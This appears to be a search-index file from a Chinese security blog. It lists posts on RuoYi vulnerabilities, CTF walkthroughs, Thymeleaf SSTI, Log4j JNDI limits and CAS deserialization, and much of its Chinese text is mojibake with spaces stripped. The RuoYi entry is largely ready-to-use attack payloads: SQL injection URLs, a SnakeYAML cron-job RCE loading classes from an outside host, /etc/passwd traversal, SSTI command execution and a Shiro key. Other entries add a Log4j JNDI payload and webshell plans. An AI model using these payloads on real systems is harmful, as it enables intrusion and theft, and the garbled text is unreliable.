&#8617;definingabeannamedâ€˜shiroFilterFactoryBeanâ€™Â &#8617;SpringBootæ•´åˆshiro-spring-boot-web-starterÂ &#8617;"
  },

  {
    "title"    : "::è‹¥ä¾:: vulnerability summary",
    "category" : "",
    "tags"     : "CVE, ä¿¡æ¯æœé›†, vulnerability",
    "url"      : "/blog/2022/ruoyi-vuln-summary/",
    "date"     : "Oct 8, 2022",
    "content"  : "SQLinjectsqli-1/prod-api/system/user/list?pageSize=&amp;params%5bdataScope%5d=and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))sqli-2/prod-api/system/role/list?params%5bdataScope%5d=and+extractvalue(1,concat(0x7e,(select+database()),0x7e))CRONjobRCEcreatePOST/prod-api/monitor/jobHTTP/1.1Host:***User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:104.0)Gecko/20100101Firefox/104.0Accept:application/json,text/plain,*/*Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding:gzip,deflateContent-Type:application/json;charset=utf-8{\"jobName\":\"123\",\"jobGroup\":\"DEFAULT\",\"invokeTarget\":\"org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager[!!java.net.URLClassLoader[[!!java.net.URL[\\\"http://fwgl.ahjkjt.com.6541b.11e4.bnslog.top\\\"]]]]')\",\"cronExpression\":\"0/20****?\",\"misfirePolicy\":1,\"concurrent\":\"0\",\"status\":\"0\"}list/prod-api/monitor/job/listrunPUT/prod-api/monitor/job/runHTTP/1.1Host:***User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:104.0)Gecko/20100101Firefox/104.0Accept:application/json,text/plain,*/*Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding:gzip,deflateContent-Type:application/json;charset=utf-8{\"jobId\":8,\"jobGroup\":\"DEFAULT\"}localfileread/common/download/resource?resource=/profile/../../../../etc/passwdthymeleafSSTIRCEPOST/monitor/cache/getNamesHTTP/1.1fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open-aCalculator')}__::.xPOST/prod-api/monitor/cache/getNamesHTTP/1.1fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open-aCalculator')}__::.xShiroCipherKey=fCq+/xW488hMTCD+cmJ3aQ==refRuoYiè‹¥ä¾"
  },

  {
    "title"    : "ICT network security CTF 2022 walkthrough",
    "category" : "",
    "tags"     : "ç¬”è®°, CTF",
    "url"      : "/blog/2022/ICT-network-security-CTF-2022-walkthrough/",
    "date"     : "Sep 30, 2022",
    "content"  : "Miscå¥‡æ€ªçš„AESé¢˜ç›®ä»£ç fromCrypto.CipherimportAESdeff(x):return(x-2)**3deffd(x):return3*((x-2)**2)defnewtonMethod(n,assum):time=nx=assuma=f(x)b=fd(x)iff(x)==0.0:returntime,xelse:next=x-a/bifa-f(next)&lt;1e-6:key=str(x)[-16:]*2returnkeyelse:returnnewtonMethod(n+1,next)defFake_CBC(key,plain):iflen(key)!=32:return\"error!\"cipher_txt=b\"\"cipher_arr=[]cipher=AES.new(key,AES.MODE_ECB)plain=[plain[i:i+32]foriinrange(0,len(plain),32)]plain_bytes=[]foriinrange(len(plain)):plain_bytes.append(bytes(plain[i],encoding=\"utf-8\"))cipher_arr.append(cipher.encrypt(plain_bytes[0]))cipher_txt+=cipher_arr[0]foriinrange(1,len(plain)):cipher=AES.new(cipher_arr[i-1],AES.MODE_ECB)cipher_arr.append(cipher.encrypt(plain_bytes[i]))cipher_txt+=cipher_arr[i]returncipher_txtkey=bytes(newtonMethod(0,X0),encoding=\"utf-8\")withopen(\"flag.txt\",\"r\")asff:s=ff.read()ff.close()withopen(\"flag_cipher\",\"wb\")asff:ff.write(Fake_CBC(key,s))ff.close()expä»£ç fromCrypto.CipherimportAESforX0inrange(0,11):deff(x):return(x-2)**3deffd(x):return3*((x-2)**2)defnewtonMethod(n,assum):time=nx=assuma=f(x)b=fd(x)iff(x)==0.0:returntime,xelse:next=x-a/bifa-f(next)&lt;1e-6:key=str(x)[-16:]*2returnkeyelse:returnnewtonMethod(n+1,next)print(X0)try:key=bytes(newtonMethod(0,X0),encoding=\"utf-8\")withopen(r'flag_cipher','rb')asf:s=f.read()cipher=AES.new(key,AES.MODE_ECB)aes=AES.new(s[:32],AES.MODE_ECB)t=aes.decrypt(s[32:64])print(cipher.decrypt(s[:32])+t)exceptExceptionase:print(e)å¾—åˆ°flageye$binwalk-Meye.jpgå‘ç°zipæ–‡ä»¶$7zal7B86.zipå±•ç¤ºzipåŒ…å«çš„æ–‡ä»¶å$7zal-slt7B86.zipæŸ¥çœ‹CRC32Path=1.txtAccessed=2022-04-2213:27:39Attributes=AÂ·Â·Â·Encrypted=+Comment=CRC=0F84C81EÂ·Â·Â·CRC32çˆ†ç ´ï¼špython2crc32.pyreverse0x0f84c81eä¾æ¬¡ç±»æ¨ï¼Œå¾—åˆ°zipè§£å‹å¯†ç ohhh_you_found_me;æœ¬ç« èŠ‚ä¸»è¦è®°å½•macä¸‹é’ˆå¯¹è¯¥ç±»èµ›é¢˜çš„å‘½ä»¤ä½¿ç”¨æ–¹æ³•ï¼ŒåŒ…æ‹¬æŸ¥çœ‹zipåŒ…å«çš„æ–‡ä»¶åä»¥åŠå¯¹åº”çš„CRC32å€¼ï¼Œåé¢çš„è¿‡ç¨‹ç•¥ã€‚å‚è€ƒ[1].2022å¹´ç¬¬ä¸‰å±Šç”µä¿¡å’Œäº’è”ç½‘è¡Œä¸šèŒä¸šæŠ€èƒ½ç«èµ›WriteUp[2].WriteUp|ç¬¬ä¸‰å±Šç”µä¿¡&amp;äº’è”ç½‘è¡Œä¸šèŒä¸šæŠ€èƒ½ç«èµ›è§£é¢˜æ€è·¯åˆ†äº«~"
  },

  {
    "title"    : "Industrial Internet CTF 2022 walkthrough",
    "category" : "",
    "tags"     : "ç¬”è®°, CTF",
    "url"      : "/blog/2022/Industrial-Internet-CTF-2022-walkthrough/",
    "date"     : "Sep 25, 2022",
    "content"  : "2022å·¥ä¸šäº’è”ç½‘CTFä¸€é“WEBï¼›#0x01ã€è€ƒç‚¹file_get_contentfuzzingå†…å®¹æ–‡ä»¶è¯»å–ï¼›$_GETå‹include_onceæœ¬åœ°æ–‡ä»¶åŒ…å«ã€‚#1x01ã€ç»•è¿‡ç»™å‡ºçš„urlä¸»é¡µé¢æœ‰ä¸€ä¸ªé“¾æ¥æŒ‡å‘åˆ°read.php?Book=ZGRsLnR4dA==ï¼Œæ˜¯ddl.txtBase64ç¼–ç ï¼Œå°è¯•äº†ä¸€äº›Linuxä¸‹çš„ç»å¯¹è·¯å¾„æ–‡ä»¶Base64payloadé¡µé¢æç¤ºå›æ˜¾book/Base64payloadä¸å­˜åœ¨æ ¹æ®æç¤ºread.phpåº”è¯¥è¯»å–çš„æ˜¯bookç›®å½•ä¸‹æ–‡ä»¶ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹bookç›®å½•ï¼Œå‘ç°ä¸­é—´ä»¶å¼€å¯äº†auto_indexï¼Œåªæœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼›å°è¯•ç›®å½•ç©¿è¶Špayloadï¼Œå…·ä½“æç¤ºå¿˜äº†ï¼Œå³çŒœæµ‹å¯¹../åšäº†ä¸€äº›æ“ä½œã€‚äºæ˜¯å°è¯•äº†ï¼š../urlç¼–ç ã€åŒå†™ç»•è¿‡ï¼Œå‘ç°åŒå†™ç»•è¿‡/read.php?Book=Li4uLy4vcmVhZC5waHA=å¯ä»¥è¯»å–ï¼šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ“ä½œä»£ç ï¼šstr_replace(array(\"../\",\"..\\\"\"),\"\",$file)#2x01ã€hintè¿›ä¸€æ­¥ä½¿ç”¨ç»„åˆçˆ†ç ´ï¼šBase64ï¼ˆ..././..././..././+æ–‡ä»¶è·¯å¾„ï¼‰å‘ç°ï¼š.bash_historyæ–‡ä»¶ï¼šcd/var/www/ctf/lscdV72J1dn23wjFrqcat*.phpæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¸­çš„hintï¼Œè€Œä¸”æ ¹æ®1x01ç« èŠ‚æˆ‘ä»¬ç›´æ¥è®¿é—®urlhttp://eci-2zeblmhade5fptwofhr8.cloudeci1.ichunqiu.com/V72J1dn23wjFrq/å¯ä»¥ç›´æ¥çœ‹åˆ°demo.phpæ–‡ä»¶ç›´æ¥è¯»å–ï¼š&lt;?phperror_reporting(0);$file=$_GET['ops'];$file=str_replace(array(\"../\",\"..\\\"\"),\"\",$file);include_once($file);\t?&gt;#3x01ã€æ–‡ä»¶åŒ…å«åŸºæœ¬æ­¥éª¤ï¼šops=file:///etc/passwdè¯»å–ç›¸å…³æ–‡ä»¶ï¼Œæ‰¾åˆ°æ—¥å¿—è·¯å¾„ï¼›æ—¥å¿—æ–‡ä»¶å†™å…¥webshellè¿‡ç¨‹2å¯ä»¥å‚è€ƒæ–‡ä»¶[1]ä¸è¿‡å½“æ—¶æ—¶é—´è¾ƒä¸ºç´§å¼ ï¼Œæš‚æœªå®Œæˆè¿™ä¸€æ­¥ï¼Œæœ‰äº›é—æ†¾ã€‚å‚è€ƒ[1].VulnHubâ€“DC-5"
  },

  {
    "title"    : "2022å¹´ç½‘é¼æ¯ç„æ­¦ç»„èµ›é¢˜å¤ç›˜-[Web-FindIT]",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WANGDINGCTF2022-WEB-FindIT-Walkthrough/",
    "date"     : "Sep 21, 2022",
    "content"  : "Web-FindITèµ›é¢˜å¤ç›˜æœ¬æ–‡ä¸»è¦å‚è€ƒã€Š2022ç½‘é¼æ¯ç„æ­¦ç»„-youcanfindité¢˜è§£â€”Springé€šç”¨MemShellæ”¹é€ ã€‹å‚è€ƒè¿›è¡Œå¤ç›˜ï¼›å®é™…ä¸Šæˆ‘ä»¬ä¸€å¼€å§‹æ‹¿åˆ°jaråŒ…ä¹Ÿæ˜¯å°è¯•å‡ ä¸ªè·¯ç”±æ˜¯å¦å­˜åœ¨SSTIæ¼æ´ï¼Œä¸è¿‡CTFåŸºæœ¬ä¸Šé€šç”¨çš„payload1åŸºæœ¬ä¸Šæ˜¯ä¸ç”Ÿæ•ˆçš„ï¼š#SSTIpayloadåŠç»•è¿‡å¤ç°æˆ‘ä»¬ç›´æ¥æŠŠpayload2æ‹¿è¿‡æ¥ï¼š/doc/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__::main.xå¯ä»¥çœ‹åˆ°consoleæŠ¥é”™UnixProcessè¯´æ˜å‘½ä»¤æ³¨å…¥æˆåŠŸäº†çš„ï¼š2022-09-2206:50:03.785INFO1---[nio-8080-exec-2]c.e.demo.controller.IndexController:info:__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::main.x2022-09-2206:50:04.004ERROR1---[nio-8080-exec-2]org.thymeleaf.TemplateEngine:[THYMELEAF][http-nio-8080-exec-2]Exceptionprocessingtemplate\"doc/java.lang.UNIXProcess@1331b3c8::[main]\":Errorresolvingtemplate[doc/java.lang.UNIXProcess@1331b3c8],templatemightnotexistormightnotbeaccessiblebyanyoftheconfiguredTemplateResolversorg.thymeleaf.exceptions.TemplateInputException:Errorresolvingtemplate[doc/java.lang.UNIXProcess@1331b3c8],templatemightnotexistormightnotbeaccessiblebyanyoftheconfiguredTemplateResolversä¸è¿‡æˆ‘ä»¬åŒæ ·å°è¯•å†™å…¥payloadæ³¨å…¥å†…å­˜é©¬æ—¶å´æŠ¥é”™æˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹å‘ç°å’Œä¹‹å‰çš„consoleæŠ¥é”™æ—¶ä¸ä¸€æ ·çš„ï¼šErrorresolvingtemplate[doc/java.lang.UNIXProcess@1331b3c8]æˆåŠŸåº”è¯¥æ˜¯æ³¨å…¥ä»£ç æˆåŠŸè¢«è¯†åˆ«æˆæ¨¡ç‰ˆï¼Œç„¶åæ±‡æŠ¥æ¨¡ç‰ˆè§£æè¿‡ç¨‹çš„é—®é¢˜ï¼ˆå¦‚ä¸Šï¼‰ï¼›è€Œå¤±è´¥åˆ™å¹¶æœªè¢«è¯†åˆ«æˆæ¨¡ç‰ˆï¼ˆå¦‚ä¸‹ï¼‰ï¼šjava.lang.IllegalArgumentException:Invalidtemplatenamespecification:ä¸è¿‡é€šè¿‡ä»¥ä¸Šçš„payloadç¡®å®æ˜¯å¯ä»¥æˆåŠŸRCEçš„ï¼šæˆ‘ä»¬éœ€è¦æ ¹æ®å‚è€ƒ2ç”Ÿæˆå†…å­˜é©¬ï¼Œå®ç°æ•ˆæœå¦‚ä¸‹ï¼šæ‰€ä»¥ä¸‹ä¸€æ­¥æ˜¯éœ€è¦æ ¹æ®payloadç”ŸæˆæŒä¹…åŒ–çš„shell3ï¼Œå› ä¸ºæœºå™¨ä¸å‡ºç½‘ï¼Œä¸”æ²¡æœ‰å›æ˜¾ï¼›æ‰€ä»¥æˆ‘ä»¬å°è¯•ææ¸…æ¥šï¼š1.ç”¨äº†@ResponseBodyæ³¨è§£çš„è·¯ç”±ï¼Œä¸å­˜åœ¨æ¼æ´ï¼›2.æ²¡æœ‰ä½¿ç”¨@ResponseBodyè¿›è¡Œæ³¨è§£çš„è·¯ç”±ï¼Œå› æ­¤å³ä½¿æ²¡æœ‰returnæƒ…å†µä¸‹ä¹Ÿæ˜¯å¯æ³¨å…¥çš„ã€‚å¦‚æœ#@ResponseBodyæˆ‘ä»¬æ‰¾åˆ°äº†å®˜æ–¹æ–‡æ¡£4ä¸€äº›å¤§ç‰›çš„è§£ç­”ï¼Œå°±ä¸åœ¨è¿™é‡Œç­é—¨å¼„æ–§äº†ï¼Œå¼•ç”¨ã€ŠThymeleafSSTIæ¼æ´åˆ†æã€‹å‚è€ƒåŸæ–‡5ï¼šé—®é¢˜1ï¼šé…ç½®äº†ResponseBodyæ³¨è§£ç¡®å®æ— æ³•è§¦å‘ï¼Œç»è¿‡è°ƒè¯•åœ¨applyDefaultViewNameä¸­ModelAndViewæ˜¯Nullï¼Œè€ŒéModelAndViewå¯¹è±¡ï¼Œæ‰€ä»¥hasView()ä¼šå¼‚å¸¸ï¼Œä¸ä¼šè®¾ç½®è§†å›¾åã€‚æ›´å¤šç§»æ­¥é…ç½®ResponseBodyæˆ–RestControlleræ³¨è§£é—®é¢˜2ï¼šå¼•ç”¨å‚è€ƒæ–‡ç« ç¬¬å››ç« åˆ†æäº†SpingMVCè§†å›¾è§£æçš„è¿‡ç¨‹ï¼Œåœ¨è§£æè§†å›¾é¦–å…ˆè·å–è¿”å›å€¼å¹¶å°è£…ä¸ºModleAndViewï¼Œè€Œåœ¨å½“å‰å½“å‰ç¯å¢ƒä¸­å¹¶æ²¡æœ‰è¿”å›å€¼ï¼ŒæŒ‰ç†è¯´ModelAndViewåº”è¯¥ä¸ºç©ºï¼Œä¸ºä»€ä¹ˆè¿˜èƒ½æ­£å¸¸å¾—åˆ°ModleAndViewå‘¢ï¼ŸåŸå› ä¸»è¦åœ¨DispatcherServlet#doDispatchä¸­ï¼Œè·å–ModleAndViewåè¿˜ä¼šæ‰§è¡ŒapplyDefaultViewNameæ–¹æ³•ã€‚æ›´å¤šç§»æ­¥urlPathä¸­ä¼ å…¥Payloadå¯ä»¥æ‰§è¡Œå‚è€ƒThymeleafæ¨¡æ¿æ³¨å…¥å‘½ä»¤æ‰§è¡ŒÂ &#8617;2022ç½‘é¼æ¯ç„æ­¦ç»„-youcanfindité¢˜è§£â€”Springé€šç”¨MemShellæ”¹é€ Â &#8617;CTF-you-can-find-it(2022ç½‘é¼æ¯ç„æ­¦ç»„webctfthymeleafSSTIbypassandmemshelltoretriveflag)Â &#8617;Thymeleaf3.0.12â€”ReleaseNotesÂ &#8617;ThymeleafSSTIæ¼æ´åˆ†æÂ &#8617;"
  },

  {
    "title"    : "äº’è”ç½‘çš„è®°å¿†",
    "category" : "daily",
    "tags"     : "",
    "url"      : "/daily/2022/Memroy-Of-Internet-FromCHN-Bybin4xin/",
    "date"     : "Sep 9, 2022",
    "content"  : "zshçš„æ˜¾ç¤ºä¼˜åŒ–é…ç½®ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰äº†ä¸€äº›ã€Œç»å…¸è¯­å½•ã€ï¼ŒåŠ å…¥äº†zshæ˜¾ç¤ºåŒºåŸŸï¼Œè¿™é‡Œå®ç°çš„ä¸»è¦éš¾ç‚¹åœ¨äºï¼šæˆ‘ä»¬å¾ˆå®¹æ˜“æŠŠã€Œç»å…¸è¯­å½•ã€åŠ å…¥åˆ°æ•°ç»„é‡Œé¢ï¼Œä¸è¿‡æˆ‘ä»¬å¸Œæœ›ï¼Œåœ¨æ¯æ¬¡æ‰“å¼€terminalæ—¶ï¼Œéƒ½æœ‰ä¸€äº›æƒŠå–œçš„æ„Ÿå—;)å®šä¹‰ä¸€ä¸ªã€Œç»å…¸è¯­å½•ã€æ•°ç»„æˆ‘ä»¬å…ˆæ‘˜æŠ„ä¸€äº›ã€Œç»å…¸è¯­å½•ã€ï¼ŒæŠŠå®ƒæ”¾å…¥æ•°ç»„ï¼Œå¹¶æ ¹æ®è‡ªå·±çš„å–œå¥½ã€Œç²‰é¥°ã€ï¼šdeclare-aexpressions=('ğŸ“£WhatareY0uf4ckingbarking.ğŸ“£''ğŸ“£WeareallF4CKINGSMALL-TOWNSWOT(LOUDLY).ğŸ“£''~~APPEARANCEISTHEFIRSTPRODUCTIVEFORCE~~;')å°±æ¯”å¦‚ä¸Šé¢'ğŸ“£WeareallF4CKINGSMALL-TOWNSWOT(LOUDLY).ğŸ“£'ï¼Œå‰ååŠ ä¸Šä¸¤ä¸ªå–‡å­emojiçš„åˆè¡·æ˜¯è¡¨ç¤ºå¼ºè°ƒï¼Œå¹¶ä¸”åé¢åŠ ä¸Šäº†è¯­æ°”è¯ï¼ˆdogeï¼‰ã€‚é¢œå€¼æ˜¯ç¬¬ä¸€ç”Ÿäº§åŠ›åˆ°æ­¤æ—¶ï¼Œæˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªå¯ç”¨çš„æ•°ç»„äº†ï¼Œé‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯éœ€è¦æŠŠå®ƒã€Œæ‚ äºšã€åœ°è¾“å‡ºå‡ºæ¥ï¼Œæ€ä¹ˆèƒ½å¤Ÿå®ç°å‰è€…ï¼Œåˆèƒ½ã€ŒæƒŠå–œã€å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç®€å•ç®—æ³•ï¼šè®¡ç®—å‡ºæ•°ç»„å¤§å°index[array]ç„¶åéšæœºåœ¨[0,index[arrary]]åŒºé—´ä¸­è¾“å‡ºå¯¹åº”çš„ã€Œç»å…¸è¯­å½•ã€å°±å¥½äº†äº2022-10-0315:35:09+0800ä¿®æ”¹#index=$((0+$RANDOM%${#expressions[@]}))#é‡æ–°å®šä¹‰äº†ä¸€ä¸ªéšæœºç®—æ³•ï¼Œä¸Šé¢å¯èƒ½å¯¼è‡´åœ¨æ•°ç»„ä¸­å–å‡ºç©ºæ•°æ®ã€‚index=$((1+$random_index))random_index=$(($RANDOM%${#expressions[@]}))selected_expression=${expressions[index]}ç¬¬ä¸€æ­¥é‡ç‚¹åœ¨äºé˜²æ­¢ç”Ÿæˆéšæœºæ•°å¯¼è‡´åŒºé—´è¿‡å¤§ï¼Œæœ€ç»ˆçš„è¾“å‡ºä¸ºç©ºï¼›æ­¤æ—¶ï¼Œæˆ‘ä»¬çš„å¤§ä½“è½®å»“å°±å·²ç»å®Œæˆäº†ï¼ŒæŠŠå®ƒå°è£…ä½ åœ¨ç‹—å«ä»€ä¹ˆå‡½æ•°å°è£…åï¼Œå‘Šè¯‰zshè°ƒç”¨å®ƒå°±å¥½ï¼Œæ•´ä¸ªä»£ç å¦‚ä¸‹ï¼šmsg_header(){declare-aexpressions=('ğŸ“£WhatareY0uf4ckingbarking.ğŸ“£''ğŸ“£WeareallF4CKINGSMALL-TOWNSWOT(LOUDLY).ğŸ“£''~~APPEARANCEISTHEFIRSTPRODUCTIVEFORCE~~;')index=$((0+$RANDOM%${#expressions[@]}))selected_expression=${expressions[index]}echo$selected_expression}PROMPT=\"%(?:%{$fg_bold[green]%}[$(msg_header)]:%{$fg_bold[red]%}[Ooooooops@@S0methingWROOONG@@])\"PROMPT+='%{$fg[cyan]%}[ğŸ¤‘ğŸ§ğŸš©:&lt;%c&gt;]%{$reset_color%}$(git_prompt_info)%{$fg_bold[white]%}$%{$fg_bold[green]%}$%{$fg_bold[yellow]%}$'ZSH_THEME_GIT_PROMPT_PREFIX=\"%{$fg_bold[yellow]%}[%{$fg_bold[blue]%}&lt;git:%{$fg[red]%}\"ZSH_THEME_GIT_PROMPT_SUFFIX=\"%{$reset_color%}%{$fg_bold[yellow]%}]\"ZSH_THEME_GIT_PROMPT_DIRTY=\"%{$fg[blue]%}&gt;%{$fg[yellow]%}%{$fg_bold[yellow]%}]\"ZSH_THEME_GIT_PROMPT_CLEAN=\"%{$fg[blue]%}&gt;\"äº2022-10-0315:35:09+0800ä¿®æ”¹å½“ä¸‹æ•ˆæœä»£ç ï¼šbigger-than-bigger::robbyrussell.zsh-themeæ•ˆæœå‚è€ƒ[1].æ¨æ—¶æ—¸.ç§‘å­¦å®¶å’Œæ¼”å‘˜æ˜¯å¹³ç­‰çš„ï¼Œç¤¾ä¼šæ”¶å…¥åˆ†é…è‡ªç„¶æœ‰å¸‚åœºå»è°ƒèŠ‚ï¼Œæœ‰æ³•åˆ¶å»ç›‘ç£ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "2022å¹´ç½‘é¼æ¯ç„æ­¦ç»„-è§£é¢˜è®°å½•",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WANGDINGCTF2022-Walkthrough/",
    "date"     : "Sep 7, 2022",
    "content"  : "é›¶ï¼šWEB#0x00web237-openlitespeedSSRF&lt;?phphighlight_file(__FILE__);if(isset($_POST[\"curl_opt\"])&amp;&amp;is_array($_POST[\"curl_opt\"])){$ch=curl_init();foreach($_POST[\"curl_opt\"]as$key=&gt;$value){curl_setopt($ch,$key,$value);}$result=curl_exec($ch);curl_close($ch);echo$result;}?&gt;ssrfå°è¯•å†™shellå¤±è´¥ï¼š#0x01web441-ezjavaè·¯ç”±ç»•è¿‡payloadhttp://localhost/;Evilç»•è¿‡if(path.startsWith(\"/Evil\"))@ResponseBody@RequestMapping({\"/Evil\"})publicStringEvil(HttpServletRequestrequest,HttpServletResponseresponse)throwsIOException,ClassNotFoundException{Stringpath=request.getRequestURI();if(path.startsWith(\"/Evil\"))return\"nonono!!!\";Stringbase=request.getParameter(\"base\");EInputStreamin=newEInputStream(newByteArrayInputStream(Base64.getDecoder().decode(base)));Objecta=in.readObject();return\"OK\";}baseå‚æ•°å¦‚ä½•ï¼Ÿè¿›ä¸€æ­¥æŸ¥çœ‹writeUpï¼š"
  },

  {
    "title"    : "Apache Log4J2 RCE JDKé™åˆ¶å®éªŒ",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Apache-log4j2-affect-By-JDK-version-walkthrough/",
    "date"     : "Jul 9, 2022",
    "content"  : "ApacheLog4j-v2RCElimitå¯¹æ¯”è¡¨JDKlog4j-core/log4j-apisetPropertyRCE8u181(&lt;8u191)2.14.0â­•(RMI/LDAP)â­•(RMI/LDAP)8u181(&lt;8u191)2.14.0âŒ(RMI/LDAP)â­•(LDAP)8u181(&lt;8u191)2.14.0âŒ(RMI/LDAP)âŒ(RMI)8u332(&gt;8u191)2.14.0â­•(RMI/LDAP)â­•(RMI)8u332(&gt;8u191)2.14.0â­•(RMI/LDAP)âŒ(LDAP)8u332(&gt;8u191)2.14.0âŒ(RMI/LDAP)âŒ(RMI/LDAP)JDKJDK6u45ã€7u21ä¹‹åï¼šjava.rmi.server.useCodebaseOnlyçš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸ºtrueã€‚å½“è¯¥å€¼ä¸ºtrueæ—¶ï¼Œå°†ç¦ç”¨è‡ªåŠ¨åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶ï¼Œä»…ä»CLASSPATHå’Œå½“å‰JVMçš„java.rmi.server.codebaseæŒ‡å®šè·¯å¾„åŠ è½½ç±»æ–‡ä»¶ã€‚ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥é˜²æ­¢å®¢æˆ·ç«¯VMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ï¼Œå¢åŠ äº†RMIClassLoaderçš„å®‰å…¨æ€§ã€‚JDK6u141ã€7u131ã€8u121ä¹‹åï¼šå¢åŠ äº†com.sun.jndi.rmi.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®šURIä¸ºLDAPåè®®æ¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚JDK6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº†com.sun.jndi.ldap.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚setPropertySystem.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\");System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");suchas:importorg.apache.logging.log4j.LogManager;importorg.apache.logging.log4j.Logger;publicclasslog4j{privatestaticLoggerlogger=LogManager.getLogger(log4j.class);publicstaticvoidmain(String[]args){System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\");System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");logger.error(\"${jndi:rmi://192.168.3.50:4001/#Exploit}\");}}RCEPROTOCOLRMILDAP-${jndi:rmi://..}${jndi:ldap://..}â­•(RMI)â­•âŒâ­•(LDAP)âŒâ­•â­•(RMI/LDAP)â­•â­•RefLOG4JJavaexploit-WAFandpatchesbypasstricksCVE-2021-44228-JNDIcodeexec"
  },

  {
    "title"    : "Apereo CAS < 4.2.x ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œ",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Apereo-CAS-Less-than-4-2-x-RCE/",
    "date"     : "Jun 6, 2022",
    "content"  : "CASé¶åœºæ­å»ºCAS::Mavenä»“åº“åœ°å€cas-server-webapp::4.1.6cas-server-webapp::4.2.7åˆ†åˆ«è¿›å…¥ä¸‹è½½Pomæˆ–è€…Warï¼Œä¸æƒ³éº»çƒ¦ç›´æ¥ä¸‹è½½WARåŒ…æ”¾åˆ°tomcatwebæ–‡ä»¶å¤¹å°±è¡Œã€‚å¦‚ä½•å‘ç°CASèµ„äº§ApereoCentralAuthenticationServiceç‰ˆæœ¬é€šè¿‡è·¯ç”±404æŠ¥é”™æŸ¥çœ‹ç‰ˆæœ¬ï¼šhttps://cas.example.com/cas/iwana404;)åœ¨CASè®¿é—®404èµ„æºæ—¶è·³è½¬302ï¼Œæœ¬åœ°ä¸ç®¡æ˜¯å¦é…ç½®HTTPSè¯ä¹¦éƒ½ä¸ä¼šè¿”å›404é¡µé¢ï¼Œæ‰€ä»¥æ’é™¤äº†HTTPSè¯ä¹¦çš„å¯èƒ½æ€§ï¼›TomcatSSLCertæˆ–è€…é¡µè„šå¤„æœ¬èº«ä¹Ÿä¼šä½“ç°ç‰ˆæœ¬ï¼šç™»å½•Postè¯·æ±‚åŒ…ä¸ªæ€§å‚æ•°POSThttp://localhost:8000/login;jsessionid=1653784B0F427BE086AD4EC81386726DHTTP/1.1Host:localhost:8000username=admin&amp;password=123&amp;execution=å¦‚ä¸Šé¢æ‰€ç¤ºçš„executionå‚æ•°ï¼ˆä¹Ÿæ˜¯ååºåˆ—åŒ–çš„å…¥å£ï¼‰"
  },

  {
    "title"    : "GitLab CVE-2021-22205 snippet RCE",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Gitlab-RCE-with-snippet-function/",
    "date"     : "May 18, 2022",
